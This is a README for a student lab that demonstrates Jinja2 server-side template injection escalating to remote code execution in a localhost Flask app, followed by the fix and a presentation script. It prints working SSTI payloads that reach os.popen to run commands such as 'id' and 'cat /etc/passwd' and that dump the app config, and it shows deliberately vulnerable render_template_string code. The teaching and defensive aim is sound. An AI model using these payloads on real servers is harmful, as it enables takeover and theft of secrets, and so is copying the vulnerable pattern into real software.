# SSTI → RCE Lab (Application Security — CAT-2)

**Attack:** Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)
**Why it's high severity:** it ends in RCE — running arbitrary operating-system
commands on the server. On the CVSS scale this is Critical (confidentiality,
integrity and availability all fully compromised).

> ⚠️ Ethics / scope: everything here runs on **your own laptop, on localhost**.
> This is a deliberately vulnerable app you built to demonstrate the attack in a
> controlled lab. Never point these techniques at a site or server you don't own.

---

## 1. Setup (about 3 minutes)

You need Python 3.8+.

```bash
# from inside the ssti-lab folder
pip install -r requirements.txt     # installs Flask
python app.py
```

Then open **http://127.0.0.1:5000** in your browser. You'll see two versions of
the same "Greeting Card Generator": a **vulnerable** one and a **secure** one.

---

## 2. What the vulnerability actually is (one sentence)

The vulnerable route puts the user's input **directly into the template that the
server executes**, instead of passing it in as data:

```python
# VULNERABLE  (app.py, /vulnerable)
inner = render_template_string("Hello, " + name + "! Have a lovely day.")
#                                            ^^^^ attacker-controlled, executed as template code
```

Jinja2 (Flask's template engine) sees `{{ ... }}` in the input and **evaluates
it**. So the input box is no longer just text — it's a code box.

---

## 3. The attack walkthrough (your live demo — do these in order)

Type each payload into the **name box** of the *vulnerable* version. The escalation
tells a story: harmless → information leak → full server takeover.

### Step 1 — Prove the input is executed, not printed
```
{{7*7}}
```
**Result:** the card says `Hello, 49!`
Narration: *"If this were safe, it would print `{{7*7}}` literally. Instead it did
the math — the server is executing my input. That confirms SSTI."*

### Step 2 — Leak internal application secrets
```
{{ config }}
```
**Result:** dumps Flask's configuration object (SECRET_KEY, settings, etc.).
Narration: *"Now I can read the app's internal config and secret keys."*

### Step 3 — Escalate to Remote Code Execution (the headline moment)
Use any one of these. They walk from a built-in object out to Python's `os`
module and run a shell command. **Start with the `lipsum` one — it's the most
reliable.**

```
{{ lipsum.__globals__['os'].popen('id').read() }}
```
**Result:** `Hello, uid=... gid=...` — the output of the real `id` command.

Backups if a payload is finicky on your machine:
```
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('uname -a').read() }}
```

Then show you can run **anything**:
```
{{ lipsum.__globals__['os'].popen('whoami').read() }}
{{ lipsum.__globals__['os'].popen('ls -la').read() }}
{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}
```
Narration: *"I'm no longer attacking the web app — I'm running commands on the
machine itself. From here an attacker can read files, steal data, plant a
backdoor, or pivot deeper into the network. This is why SSTI is rated Critical."*

> Tip: payloads work the same if you type them in the box OR put them in the URL,
> e.g. `http://127.0.0.1:5000/vulnerable?name={{7*7}}`. Typing in the box looks
> more convincing live.

---

## 4. The fix / prevention (your "...and here's how to stop it" slide)

Open the **secure** version and type `{{7*7}}` — it prints `{{7*7}}` literally.
Nothing executes. Here is why:

```python
# SECURE  (app.py, /secure)
return render_template("card.html", name=name)   # 'name' is DATA, not code
```
```html
<!-- card.html -->
<p>Hello, {{ name }}! Have a lovely day.</p>      <!-- auto-escaped -->
```

**The core rule:** *never build a template out of user input.* Pass user input as
a **context variable** and let the template engine auto-escape it.

Defense-in-depth points to mention:
- **Don't** use `render_template_string()` (or string-concatenate) with any
  user-controlled data. Keep templates as fixed files; user data goes in as
  variables only.
- Keep **auto-escaping on** (Flask does this by default for `.html` templates).
- If you genuinely must render user-supplied templates, use a
  **sandboxed environment** (`jinja2.sandbox.SandboxedEnvironment`) — but avoiding
  it entirely is safer.
- Run the app as a **low-privilege user** (not root) so that even if RCE happens,
  the blast radius is smaller. Add input validation / allow-lists where possible.

---

## 5. Suggested 3-minute presentation script

1. **Setup (10s):** "Team topic: web application vulnerabilities. My attack is
   Server-Side Template Injection leading to Remote Code Execution — rated
   Critical severity."
2. **The app (15s):** show the Greeting Card Generator. "Totally normal-looking
   feature — type a name, get a card."
3. **It's actually a code box (30s):** type `{{7*7}}` → `49`. Explain why that
   proves the server is executing input.
4. **Information leak (20s):** `{{ config }}` → secrets dumped.
5. **Full takeover (45s):** run `id`, `whoami`, `cat /etc/passwd`. "I'm running OS
   commands on the server now."
6. **Impact (20s):** data theft, backdoors, lateral movement → why it's Critical.
7. **The one-line root cause (20s):** user input was used as template *source*.
8. **The fix (30s):** switch to the secure version, same payload prints literally;
   explain "pass input as data, never as template code," plus least-privilege.
9. **Close (10s):** "Prevention: fixed templates + variables + auto-escaping +
   least privilege."

---

## 6. Likely questions from the instructor (prep)

- **"How is this different from XSS?"** XSS runs in the *victim's browser* (client
  side). SSTI runs on the *server* and can reach the OS — far more severe.
- **"Why does `{{7*7}}` prove anything?"** A safe app treats it as text and prints
  it verbatim. Getting `49` means the engine evaluated it, i.e. our input reached
  the template compiler.
- **"How does the RCE payload actually work?"** Jinja gives access to Python
  objects; from a harmless object (`lipsum`) you reach `__globals__`, then the
  `os` module, then `popen()` to spawn a shell command.
- **"Real-world examples?"** SSTI has hit major platforms and is a standard finding
  in bug-bounty programs; it maps to OWASP **A03: Injection**.
- **"Which engines are affected?"** The class of bug exists across Jinja2 (Python),
  Twig/Smarty (PHP), FreeMarker/Velocity (Java), ERB (Ruby), Handlebars (Node), etc.

---

## Files
- `app.py` — the Flask app (vulnerable + secure routes, heavily commented)
- `templates/index.html` — landing page
- `templates/vuln.html` — vulnerable page shell
- `templates/card.html` — secure page (the fix)
- `requirements.txt` — Flask
